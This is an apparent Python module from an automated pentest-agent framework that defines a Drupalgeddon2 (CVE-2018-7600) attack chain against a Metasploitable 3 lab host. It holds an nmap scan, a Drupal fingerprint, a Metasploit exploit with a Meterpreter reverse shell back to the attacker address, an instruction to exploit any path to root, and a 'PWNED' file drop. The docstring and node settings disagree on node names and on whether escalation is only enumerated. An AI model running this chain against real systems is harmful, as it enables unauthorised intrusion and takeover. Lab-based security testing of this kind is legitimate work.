"""
Example Attack Graph: Drupal "Drupalgeddon2" RCE (Metasploitable 3)

Unauthenticated remote-code-execution chain against MS3's Drupal install,
served by Apache under /drupal on port 80. CVE-2018-7600 (Drupalgeddon2)
is a pre-auth RCE in Drupal core's form-rendering/Form API that lets an
unauthenticated attacker execute arbitrary code, which Metasploit
weaponizes into a PHP Meterpreter session.

Chain:
  recon            — nmap full scan
  drupal_check     — curl CHANGELOG.txt to fingerprint the Drupal app
  drupal_rce       — exploit/unix/webapp/drupal_drupalgeddon2 -> meterpreter
  escalate   — id / sudo -l / find SUID enumeration from the session
  file_drop        — write proof-of-compromise file and read it back

Expected: clean run lands a PHP Meterpreter session as the web user
(typically www-data). escalate should report no easy root path,
which is the correct "honest" signal -- the replanner can decide whether
to escalate or wrap up with file_drop in a writable directory.
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)


def build_drupal_drupalgeddon2_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the Metasploitable 3 target via the Drupal "
                  "\"Drupalgeddon2\" vulnerability (CVE-2018-7600) on the "
                  "Apache server at port 80 under /drupal. Land a Meterpreter "
                  "session, enumerate privileges from the session, and drop "
                  "a proof-of-compromise file.",
        target_ip=target_ip,
        name=f"drupal_drupalgeddon2_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="Drupal Drupalgeddon2 unauth RCE baseline against MS3.",
        metadata={"scenario": "drupal_drupalgeddon2_rce", "target_type": "metasploitable3"},
    )

    # =========================================================================
    # NODES
    # =========================================================================

    graph.add_node(AttackNode(
        id="recon",
        label="Nmap Full Scan",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's attack surface and confirm Apache on 80",
        objective=f"Full port scan with service versioning on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -sV -p 0-65535 {target_ip}"],
        tags=["nmap", "full_scan"],
    ))

    graph.add_node(AttackNode(
        id="fingerprint",
        label="Drupal App Fingerprint",
        tactic=Tactic.DISCOVERY.value,
        technique_id="T1592.002",
        technique_name="Gather Victim Host Info: Software",
        agent_type="recon",
        goal="Confirm a Drupal app is served under /drupal and read its version",
        objective=f"Curl the Drupal CHANGELOG to fingerprint the app at "
                  f"http://{target_ip}/drupal/.",
        target_ip=target_ip,
        tool_name="ssh",
        commands_to_run=[f"curl -sS -m10 http://{target_ip}/drupal/CHANGELOG.txt"],
        max_retries=1,
        tags=["drupal", "fingerprint", "version_check"],
    ))

    graph.add_node(AttackNode(
        id="drupal_rce",
        label="Drupal Drupalgeddon2 RCE",
        tactic=Tactic.INITIAL_ACCESS.value,
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        agent_type="exploit",
        goal="Obtain a Meterpreter session via Drupalgeddon2",
        objective=f"Run exploit/unix/webapp/drupal_drupalgeddon2 against "
                  f"{target_ip}:80 with TARGETURI /drupal/; payload "
                  f"php/meterpreter/reverse_tcp.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/unix/webapp/drupal_drupalgeddon2",
        module_options={
            "RHOSTS": target_ip,
            "RPORT": 80,
            "TARGETURI": "/drupal/",
        },
        payload="php/meterpreter/reverse_tcp",
        payload_options={
            "LHOST": attacker_ip,
            "LPORT": 4454,
        },
        max_retries=3,
        tags=["drupal", "drupalgeddon2", "rce", "unauth"],
    ))

    graph.add_node(AttackNode(
        id="escalate",
        label="Escalate Privileges to Root",
        tactic=Tactic.PRIVILEGE_ESCALATION.value,
        technique_id="T1068",
        technique_name="Exploitation for Privilege Escalation",
        agent_type="privesc",
        goal="Escalate the compromised session to root",
        objective="From the existing session, enumerate AND exploit any viable "
                  "privilege-escalation vector (sudo, SUID, kernel exploit, cron, "
                  "capabilities, writable config, docker group) to obtain a root "
                  "shell. Verify success with id/whoami showing uid=0.",
        target_ip=target_ip,
        max_retries=3,
        tags=["privesc", "escalation", "goal_only"],
    ))

    graph.add_node(AttackNode(
        id="file_drop",
        label="Drop Proof-of-Compromise File",
        tactic=Tactic.IMPACT.value,
        technique_id="T1485",
        technique_name="Data Destruction",
        agent_type="impact",
        goal="Demonstrate compromise with a written artifact",
        objective="Write a proof-of-compromise file via the session and read it back.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "echo '{marker}' > {target_file}",
            "echo \"Compromised at $(date)\" >> {target_file}",
            "echo \"User: $(whoami)\" >> {target_file}",
            "cat {target_file}",
        ],
        command_params={
            "target_file": "/tmp/pwned_drupal.txt",
            "marker": "PWNED via Drupal Drupalgeddon2",
        },
        command_params_alternatives={
            "target_file": ["/var/tmp/pwned_drupal.txt", "/dev/shm/pwned_drupal.txt"],
        },
        max_retries=3,
        metadata={"target_file": "/tmp/pwned_drupal.txt"},
        tags=["impact", "file_drop", "proof"],
    ))

    # =========================================================================
    # EDGES
    # =========================================================================

    graph.connect(
        "recon", "fingerprint",
        checks=[
            EdgeCheck(
                field="ports", operator="any_port",
                expected={"port": 80},
                description="HTTP service is open on 80",
            ),
        ],
        evidence="Nmap found HTTP on port 80",
        rationale="Fingerprint the Drupal app before firing the exploit",
    )

    graph.connect(
        "fingerprint", "drupal_rce",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="Drupal app fingerprinted",
            ),
        ],
        evidence="Drupal confirmed under /drupal",
        rationale="Vulnerable Drupal core -- exploit Drupalgeddon2",
    )

    graph.connect(
        "drupal_rce", "escalate",
        checks=[
            EdgeCheck(
                field="session_id", operator="exists",
                description="Meterpreter session opened",
            ),
        ],
        evidence="Got Meterpreter session via Drupalgeddon2",
        rationale="Enumerate privesc paths from the new (likely www-data) session",
    )

    graph.connect(
        "escalate", "file_drop",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="Session is usable",
            ),
        ],
        evidence="Session privileges enumerated",
        rationale="Drop the proof-of-compromise file as the impact step",
    )

    return graph


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    graph = build_drupal_drupalgeddon2_graph(
        target_ip="192.168.34.7",
        attacker_ip="192.168.34.6",
    )
    print(graph.summary())
    print()

    out_path = "examples/drupal_drupalgeddon2_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")

    loaded = AttackGraph.load(out_path)
    print(f"\nReloaded: {loaded}")
    print(f"Ready nodes: {loaded.ready_nodes()}")
